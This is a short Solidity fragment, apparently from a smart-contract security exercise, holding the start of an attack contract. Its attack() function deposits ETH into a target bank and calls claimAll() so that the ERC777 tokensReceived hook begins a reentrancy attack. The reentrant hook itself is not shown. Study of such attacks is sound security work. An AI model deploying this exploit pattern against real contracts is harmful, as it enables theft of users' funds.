	...
	*/
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
		//YOUR CODE TO START ATTACK GOES 
    require(msg.value ==amt, "incorrect ETH amount sent");
    
    // Deposit ETH to get ERC777 token
    bank.deposit{value: amt}();

    //After deposit, the ERC777 tokens are sent to this contract,
    // triggering the tokensReceived function and starting the reentrancy attack.
    bank.claimAll();
